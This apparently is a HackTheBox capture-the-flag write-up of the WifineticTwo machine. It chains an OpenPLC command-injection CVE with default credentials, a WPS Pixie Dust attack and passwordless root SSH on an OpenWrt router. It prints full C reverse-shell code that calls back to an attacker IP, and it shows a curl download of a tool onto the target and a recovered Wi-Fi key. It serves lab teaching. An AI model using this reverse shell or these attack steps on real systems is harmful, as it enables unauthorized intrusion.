---
layout: writeup
category: HTB
description: WifineticTwo is a linux medium machine where we can practice wifi hacking. First, I will exploit a OpenPLC runtime instance that is vulnerable to [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630) that gives C code execution on a machine with hostname "attica03". From there, I have noticed a wlan0 interface which is strange in HackTheBox. Using iw command, I'm able to scan wifi network and see a router vulnerable to pixiedust. When I have retrieved the password, I can connect to the wifi network and see ports opened in the AP. Port 22 is open and we can connect without password to the router as root (OpenWrt defaults).
points: 30
solves: 3736
tags: openplc cve-2021-31630 wifi-scanning pixiedust port-scanning ssh
date: 2024-07-24
title: HTB WifineticTwo writeup
comments: false
---

WifineticTwo is a linux medium machine where we can practice wifi hacking. First, I will exploit a OpenPLC runtime instance that is vulnerable to [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630) that gives C code execution on a machine with hostname "attica03". From there, I have noticed a wlan0 interface which is strange in HackTheBox. Using iw command, I'm able to scan wifi network and see a router vulnerable to pixiedust. When I have retrieved the password, I can connect to the wifi network and see ports opened in the AP. Port 22 is open and we can connect without password to the router as root (OpenWrt defaults).

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.7
# Nmap 7.94SVN scan initiated Fri Apr 12 20:51:06 2024 as: nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.7
Nmap scan report for 10.10.11.7
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZhmCsQ.DW--xrEsTuTwmS8qtLbb5eu9NpM; Expires=Fri, 12-Apr-2024 18:56:29 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Fri, 12 Apr 2024 18:51:29 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZhmCsA.yyzM89x9YbUtORHt5EFnxfU49xY; Expires=Fri, 12-Apr-2024 18:56:28 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Fri, 12 Apr 2024 18:51:28 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZhmCsA.ORvmM2rmJyX8Mr7_y4bU5xKvypI; Expires=Fri, 12-Apr-2024 18:56:28 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Fri, 12 Apr 2024 18:51:28 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=4/12%Time=661982AF%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm
SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\
SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn
SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZhmCsA\.yyzM89x9YbUtORHt5EFnx
SF:fU49xY;\x20Expires=Fri,\x2012-Apr-2024\x2018:56:28\x20GMT;\x20HttpOnly;
SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x
SF:20Fri,\x2012\x20Apr\x202024\x2018:51:28\x20GMT\r\n\r\n<!DOCTYPE\x20HTML
SF:\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Red
SF:irecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x2
SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20hre
SF:f=\"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%
SF:r(HTTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html
SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co
SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZhmCsA\.ORvm
SF:M2rmJyX8Mr7_y4bU5xKvypI;\x20Expires=Fri,\x2012-Apr-2024\x2018:56:28\x20
SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz
SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Fri,\x2012\x20Apr\x202024\x2
SF:018:51:28\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x2
SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont
SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>4
SF:00\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20
SF:request\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon
SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG
SF:VybWFuZW50Ijp0cnVlfQ\.ZhmCsQ\.DW--xrEsTuTwmS8qtLbb5eu9NpM;\x20Expires=F
SF:ri,\x2012-Apr-2024\x2018:56:29\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver
SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Fri,\x2012\x20Apr\
SF:x202024\x2018:51:29\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W
SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</ti
SF:tle>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x
SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\
SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga
SF:in\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 12 20:51:41 2024 -- 1 IP address (1 host up) scanned in 35.82 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

There is port 22 and port 8080. 22 is ssh and since I don't have credentials I will look forward port 8080.

## Web enumeration
            
Looking at the headers, I can see a cookie named 'session' and that its server is Werkzeug python:

```bash
❯ curl -i -s http://10.10.11.7:8080/ | head -n 12
HTTP/1.0 302 FOUND
content-type: text/html; charset=utf-8
content-length: 219
location: http://10.10.11.7:8080/login
vary: Cookie
set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZqFUKg.fltp46Y6xlo2kuQ-30W2af1vGt8; Expires=Wed, 24-Jul-2024 19:26:14 GMT; HttpOnly; Path=/
server: Werkzeug/1.0.1 Python/2.7.18
date: Wed, 24 Jul 2024 19:21:14 GMT
connection: keep-alive

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
```

It consists in something called 'OpenPLC Webserver':

![main page](/assets/images/WifineticTwo/main-page.png)

Which is a open source programmable logic controller as said in Google:

![what is OpenPLC](/assets/images/WifineticTwo/what-is-openplc.png)

Looking for vulnerabilities, I saw [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630). This vulnerability consists in a command injection on /hardware page of the application:

![cve 2021 31630 nvd](/assets/images/WifineticTwo/cve-2021-31630-nvd.png)

In that page there is also a reference to a exploit in packetstorm, which is a python script:

![packetstorm exploit](/assets/images/WifineticTwo/packetstorm-exploit.png)

This piece of code tells us that authentication its needed:

```python
parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://target-uri:8080)")
parser.add_option('-l', '--user', action="store", dest="user", help="User credential to login")
parser.add_option('-p', '--passw', action="store", dest="passw", help="Pass credential to login")
parser.add_option('-i', '--rip', action="store", dest="rip", help="IP for Reverse Connection")
parser.add_option('-r', '--rport', action="store", dest="rport", help="Port for Reverse Connection")
```

That makes sense as /hardware redirects to /login:

```bash
❯ curl -i -s http://10.10.11.7:8080/hardware | head -n 12
```
![hardware redirects to login](/assets/images/WifineticTwo/hardware-redirect-to-login.png)

# Access as root on attica03

Since I don't have access to the panel, I will search for default credentials, which turn out to be user "openplc" and password "openplc":

![openplc default credentials](/assets/images/WifineticTwo/openplc-default-credentials.png)

Once I enter them in the login, it sets a cookie and redirects to /dashboard, so it works:

![login success](/assets/images/WifineticTwo/login-success.png)

Now I have access to the panel:

![access to panel](/assets/images/WifineticTwo/access-to-panel.png)

As now I have access, I will try to exploit the RCE vulnerability.

The python script of packetstorm submits the C code to /hardware and then does a GET request to /start_plc after logging in:

```python

compile_program = options.url + '/compile-program?file=681871.st' 
run_plc_server = options.url + '/start_plc'

<..SNIP..>

def connection():
    print('[+] Attempt to Code injection...')
    inject_url = host + "/hardware"
    inject_dash = host + "/dashboard"
    inject_cookies = {<..SNIPPED HEADERS..>}
    inject_data = "<..SNIPPED C CODE..>"
    inject = x.post(inject_url, headers=inject_headers, cookies=inject_cookies, data=inject_data)
    time.sleep(3)
    comp = x.get(compile_program)
    time.sleep(6)
    x.get(inject_dash)
    time.sleep(3)
    print('[+] Spawning Reverse Shell...')
    start = x.get(run_plc_server)
    time.sleep(1)
```

I don't know why it also does a GET request to /compile-program?file=681871.st after uploading it but it's not necessary because there is already a program called "blank_program" in Programs:

![blank program in programs](/assets/images/WifineticTwo/blank-program-in-programs.png)

The script on the packetstorm repository didn't work to me so I extracted the C code it submits to /hardware and replaced rev_port and rev_ip with mine:

```c
#include "ladder.h"
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>


//-----------------------------------------------------------------------------

//-----------------------------------------------------------------------------
int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

//-----------------------------------------------------------------------------

//-----------------------------------------------------------------------------
void initCustomLayer()
{
   
    
    
}


void updateCustomIn()
{

}


void updateCustomOut()
{
    int port = 443;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.100");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
```

Also remember to paste it in /hardware and click "Save changes":

![C code pasted in /hardware](/assets/images/WifineticTwo/c-code-pasted-in-hardware.png)

It successfully compiles:

![successfully compiled](/assets/images/WifineticTwo/successfully-compiled.png)

Now it's the moment to receive my beloved reverse shell so I will start a nc listener on the port I specified (443):

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

And click "Start PLC" (which is the button that submits the GET request to /start_plc as saw in the script) in /dashboard:

![click start plc](/assets/images/WifineticTwo/click-start-plc.png)

And I receive my reverse shell as root in a host called "attica03", which is not the machine's IP (10.10.11.7). It's 10.0.3.4 and 10.0.3.237:

![shell received](/assets/images/WifineticTwo/rev-shell-received.png)

Also I can see user.txt in the root directory:

```bash
root@attica03:/root# ls
user.txt
root@attica03:/root# cat user.txt 
04****************************58
```

To have a stabilized tty shell, I will run the following commands:

```bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@attica03:/opt/PLC/OpenPLC_v3/webserver# ^Z
[1]  + 24733 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 24733 continued  nc -lvnp 443
                                    reset xterm
root@attica03:/opt/PLC/OpenPLC_v3/webserver# export TERM=xterm
root@attica03:/opt/PLC/OpenPLC_v3/webserver# export SHELL=bash
root@attica03:/opt/PLC/OpenPLC_v3/webserver# stty rows 50 columns 184
```
* script /dev/null -c bash: Spawns a tty.
* ctrl+z: puts the shell in background for later doing a treatment.
* stty raw -echo;fg: gives the shell back again.
* reset xterm: resets the terminal to give the bash console.
* export TERM=xterm: let do ctrl+l to clean the terminal.
* export SHELL=bash: specifies the system that it's using a bash console.
* stty rows <YOUR ROWS> columns <YOUR COLUMNS>: sets the size of the current full terminal window. It is possible to view the right size for your window running `stty size` in a entire new window on your terminal.

# Access as root on ap

## Enumeration

Looking at the interfaces available, I noticed wlan0 and eth0:

```bash
root@attica03:/opt/PLC/OpenPLC_v3/webserver# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.4  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fe79:d1d2  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:79:d1:d2  txqueuelen 1000  (Ethernet)
        RX packets 22918  bytes 2218765 (2.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 17779  bytes 3144138 (3.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 19  bytes 1248 (1.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19  bytes 1248 (1.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:04:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

wlan0 has a wireless extension in managed mode with no access points connected:

```bash
root@attica03:/opt/PLC/OpenPLC_v3/webserver# iwconfig
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          
lo        no wireless extensions.

eth0      no wireless extensions.
```

Scanning this wifi network as described in [this forum](https://askubuntu.com/questions/567006/how-can-i-display-the-list-of-available-wi-fi-networks), I can see a SSID named "plcrouter" with WPS enabled:

```bash
root@attica03:/opt/PLC/OpenPLC_v3/webserver# iw dev wlan0 scan
BSS 02:00:00:00:01:00(on wlan0)
	last seen: 8496.384s [boottime]
	TSF: 1722080275986262 usec (19931d, 11:37:55)
	freq: 2412
	beacon interval: 100 TUs
	capability: ESS Privacy ShortSlotTime (0x0411)
	signal: -30.00 dBm
	last seen: 0 ms ago
	Information elements from Probe Response frame:
	SSID: plcrouter
	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 1
	ERP: Barker_Preamble_Mode
	Extended supported rates: 24.0 36.0 48.0 54.0 
	RSN:	* Version: 1
		* Group cipher: CCMP
		* Pairwise ciphers: CCMP
		* Authentication suites: PSK
		* Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
	Supported operating classes:
		* current operating class: 81
	Extended capabilities:
		* Extended Channel Switching
		* SSID List
		* Operating Mode Notification
	WPS:	* Version: 1.0
		* Wi-Fi Protected Setup State: 2 (Configured)
		* Response Type: 3 (AP)
		* UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
		* Manufacturer:  
		* Model:  
		* Model Number:  
		* Serial Number:  
		* Primary Device Type: 0-00000000-0
		* Device name:  
		* Config methods: Label, Display, Keypad
		* Version2: 2.0
```

## Pixiedust

As WPS its enabled, I will try easy things first and try a [PixieDust attack](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi?fallback=true#wps-pixie-dust-attack) using a tool called [OneShot-C](https://github.com/nikita-yfh/OneShot-C). The purpose of using this tool is that I don't need to change into monitor mode.

I will clone the repository in my machine, compile it and transfer the binary into WifineticTwo:

```bash
❯ git clone https://github.com/nikita-yfh/OneShot-C
Cloning into 'OneShot-C'...
remote: Enumerating objects: 32, done.
remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 32 (delta 17), reused 4 (delta 0), pack-reused 0
Receiving objects: 100% (32/32), 19.20 KiB | 468.00 KiB/s, done.
Resolving deltas: 100% (17/17), done.
❯ cd OneShot-C
❯ make
gcc oneshot.c -s -O3 -o oneshot
❯ ls oneshot
oneshot
```

**Start a HTTP server for the transfer**:
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**And download it into /tmp of WifineticTwo**
```bash
root@attica03:/opt/PLC/OpenPLC_v3/webserver# cd /tmp/
root@attica03:/tmp# curl http://10.10.14.100/oneshot -o oneshot
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 52408  100 52408    0     0   291k      0 --:--:-- --:--:-- --:--:--  292k
# Give it execute permissions:
root@attica03:/tmp# chmod +x oneshot 
```

Now, I will take the MAC of the access point from the scan above and execute a pixie dust attack with `-K`:

```bash
root@attica01:/tmp# ./oneshot -b 02:00:00:00:01:00 -i wlan0 -K
[*] Running wpa_supplicant...
[*] Trying pin 12345670...
[*] Scanning...
[*] Authenticating...
[+] Authenticated
[*] Associating with AP...
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response...
[*] Received WPS Message M1
[P] E-Nonce: d1b07d05a4edfd665d195712dbf93230
[*] Building Message M2
[P] PKR: 67fc7584961d58d52a8461703c9130d9cf61a39ebd2a184f48dd86e864b958dbdfc4ea240cd55f1c0855d93cffbaed4268d05deb5cc57ae9c47a2601c57c9ce53aa6d073cf2f7cfc096ad838752b3b7bb3b6d47363bad1ef66dfab8e72ca561f2d1c5fc1592f8a4f706402007ef56081ab0e56c62c78d62b110123f2c54800425151b604d0b2da88c493f13a687cb99f566de70bc848b8fee1e830cd154919f6c72a6cfcaa9517ffe9385b6ae7a15b3e6234f2a3bf8d122a7be3e8822fb2bb2f
[P] PKE: d67e221ebe6459141848b5736670d8cc963f1b03704e17a1f8c61434957f60bc7da828180ddc6bad9266d54a18d551f2542ef0eedcef1e904588cd9e4da6a06c0e935775dd869e1e72f3b1b37e58da3d34afbabb5638f528e4c1ad5e4d6cf71f3d4d836a29fdcdafc8d0ecd56c8c7c1dccc069962e1c0cafcb5445daeb2904d46846c58ae697c7553535f65ab3da02b59d3f90880cb149699ea16266297c425bc6bfca4bafb5b81a5a7c17ce0f94739380ea9085732486adb9f5455a95170a61
[P] Authkey: e1705f10ed50bc70433412bb70b8ac4af666bfb5fa1deb02c4c1ded77dd5c9d8
[*] Received WPS Message M3
[P] E-Hash1: 26c137579795ad7e9920d3c285fd3dde02bff190417ed9efde42f2d9fb4574c1
[P] E-Hash2: f9510ac9f5187398fd53c3b8ee5637f25d3fe27d59c1ff8ffafe942fe5c14949
[*] Building Message M4
[*] Received WPS Message M5
[*] Building Message M6
[*] Received WPS Message M7
[+] WPS PIN: 12345670
[+] WPA PSK: NoWWEDoKnowWhaTisReal123!
[+] AP SSID: plcrouter
```

In "WPA PSK", its received the password of the "plcrouter" SSID and I'm also connected to plcrouter:

```bash
root@attica01:/tmp# iwconfig wlan0
wlan0     IEEE 802.11  ESSID:"plcrouter"  
          Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:01:00   
          Bit Rate:12 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          Link Quality=70/70  Signal level=-30 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:11   Missed beacon:0
```

If for some reason you need to connect manually, you can use the response of the question of [this forum](https://askubuntu.com/questions/294257/connect-to-wifi-network-through-ubuntu-terminal) which says how to connect to a wifi using only the terminal.

To assign an IP for the network using, I will use this command:

```bash
root@attica01:/tmp# ip addr add 192.168.1.3/24 dev wlan0
root@attica01:/tmp# ifconfig wlan0
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.3  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::ff:fe00:200  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 8  bytes 1245 (1.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26  bytes 3240 (3.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Host scan

Now that I'm connected to a wifi network, I will scan for active hosts using this oneliner. This oneliner goes from 1 to 254 and makes a ping to the host 192.168.1.$i with 1 second of timeout hiding the output (that's why using &>/dev/null). If the command executed successfully (that's why using &&), it will print that the host is active:

```bash
root@attica01:/tmp# for i in $(seq 1 254); do timeout 1 bash -c "ping -c 1 192.168.1.$i" &>/dev/null && echo "Host 192.168.1.$i is active";done
Host 192.168.1.1 is active
Host 192.168.1.3 is active
```

Apart from my IP address (192.168.1.3), there's only one IP which is the router (192.168.1.1), so I will scan ports uploading a nmap static binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap):

```bash
root@attica01:/tmp# ./nmap -v -sS --min-rate 5000 -p- -n -Pn --open 192.168.1.1 -oN ports-router
<SNIP>
root@attica01:/tmp# cat ports-router 
Unable to find nmap-services!  Resorting to /etc/services
# Nmap 6.49BETA1 scan initiated Sat Jul 27 12:18:52 2024 as: ./nmap -v -sS --min-rate 5000 -p- -n -Pn --open -oN ports-router 192.168.1.1
<SNIP>
Host is up (0.000015s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https
MAC Address: 02:00:00:00:01:00 (Unknown)

Read data files from: /etc
# Nmap done at Sat Jul 27 12:19:15 2024 -- 1 IP address (1 host up) scanned in 22.59 seconds
```

There is port 22 so I will try connecting as root without password because it's a router and it's very possible that there is no password:

```bash
root@attica01:/tmp# ssh root@192.168.1.1
The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.
ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.1' (ED25519) to the list of known hosts.


BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
root@ap:~# 
```

It worked! Now it's possible to see root.txt:

```bash
root@ap:~# cat root.txt 
bd****************************34
```

# Extra

It's not possible to gain access to the host machine (which is WifineticTwo, 10.10.11.7) because the purpose of this machine probably was to learn WPS pixiedust attack.

The interface eth0 its probably a interface with WifineticTwo as a route to create a new machine to each user for OpenPLC. Probably, the autor created this because if all the users received the shell in the same machine, it will be a chaos to try to connect to the wifi with WPS, assigning IP, etc. Also, if one user has already connected to the wifi, another user wouldn't need to make the pixiedust attack, so the need to learn this attack is lost.

I'm very curious of how the machines are created for each user, but unfortunately it's not possible.

That's the machine guys. Hope you enjoyed!
